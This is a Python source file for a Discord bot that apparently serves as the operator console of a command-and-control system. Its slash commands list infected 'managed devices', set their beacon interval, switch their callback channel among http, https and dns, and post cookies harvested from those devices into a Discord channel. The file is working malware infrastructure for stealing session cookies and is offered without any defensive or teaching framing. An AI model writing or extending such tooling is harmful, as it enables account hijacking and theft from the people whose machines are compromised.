"""
Discord bot entry point.
Uses slash commands (app_commands) with autocomplete for a better UX,
and logs every command invocation to the terminal for tracking.
"""

import logging

import discord
from discord import app_commands
from discord.ext import commands

from config import (
    ADMIN_DISCORD_ID,
    COMMAND_PREFIX,
    DISCORD_BOT_TOKEN,
    VALID_BEACON_INTERVALS,
    VALID_COMMUNICATION_PROTOCOLS,
)
from devices import DeviceManager

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("discord-bot")

# ---------------------------------------------------------------------------
# Bot setup
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
device_manager = DeviceManager()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def is_admin_user(interaction: discord.Interaction) -> bool:
    """Check whether the interaction author is the authorised admin."""
    return interaction.user.id == ADMIN_DISCORD_ID


def log_command(
    interaction: discord.Interaction,
    command_name: str,
    args: str = "",
) -> None:
    """Log a command invocation to the terminal."""
    user = interaction.user
    guild = interaction.guild
    channel = interaction.channel

    guild_name = guild.name if guild else "DM"
    channel_name = getattr(channel, "name", "unknown")

    args_display = f" ({args})" if args else ""
    logger.info(
        "Command /%s%s executed by %s (ID: %s) in #%s @ %s",
        command_name,
        args_display,
        user,
        user.id,
        channel_name,
        guild_name,
    )


def log_access_denied(interaction: discord.Interaction, command_name: str) -> None:
    """Log a denied access attempt to the terminal."""
    user = interaction.user
    logger.warning(
        "ACCESS DENIED: /%s attempted by %s (ID: %s)",
        command_name,
        user,
        user.id,
    )


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready() -> None:
    """Sync slash commands and log a message when the bot connects."""
    try:
        synced = await bot.tree.sync()
        logger.info(
            "Bot connected as %s (ID: %s) — synced %d slash command(s)",
            bot.user,
            bot.user.id,  # type: ignore[union-attr]
            len(synced),
        )
    except Exception as e:
        logger.error("Failed to sync commands: %s", e)

    logger.info("Waiting for commands...")


# ---------------------------------------------------------------------------
# Autocomplete callbacks
# ---------------------------------------------------------------------------

async def beacon_interval_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[int]]:
    """Provide autocomplete options for beacon interval values."""
    return [
        app_commands.Choice(name=f"{val} seconds", value=val)
        for val in VALID_BEACON_INTERVALS
        if current == "" or str(val).startswith(current)
    ]


async def protocol_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for communication protocols."""
    return [
        app_commands.Choice(name=proto, value=proto)
        for proto in VALID_COMMUNICATION_PROTOCOLS
        if current == "" or proto.startswith(current.lower())
    ]


# ---------------------------------------------------------------------------
# Slash Commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="show-devices",
    description="Display all managed devices and their status.",
)
async def show_devices(interaction: discord.Interaction) -> None:
    """Send the list of managed devices to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "show-devices")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "show-devices")
    response = device_manager.show_devices()
    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-beacon-interval",
    description="Set the beacon interval. Valid values: 2, 8, 16, 32.",
)
@app_commands.autocomplete(interval=beacon_interval_autocomplete)
@app_commands.describe(interval="Beacon interval in seconds (2, 8, 16, or 32)")
async def set_beacon_interval(
    interaction: discord.Interaction,
    interval: int,
) -> None:
    """Set the beacon interval to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-beacon-interval")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-beacon-interval", f"interval={interval}")
    response = device_manager.set_beacon_interval(interval)
    await interaction.response.send_message(response)


@bot.tree.command(
    name="request-cookies",
    description="Display all stored cookies from managed devices.",
)
async def request_cookies(interaction: discord.Interaction) -> None:
    """Send the current cookie list to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-cookies")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "request-cookies")
    response = device_manager.request_cookies()
    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-communication-protocol",
    description="Set the communication protocol. Valid: http, https, dns.",
)
@app_commands.autocomplete(protocol=protocol_autocomplete)
@app_commands.describe(protocol="Protocol to use (http, https, or dns)")
async def set_communication_protocol(
    interaction: discord.Interaction,
    protocol: str,
) -> None:
    """Set the communication protocol to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-communication-protocol")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-communication-protocol", f"protocol={protocol}")
    response = device_manager.set_communication_protocol(protocol)
    await interaction.response.send_message(response)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
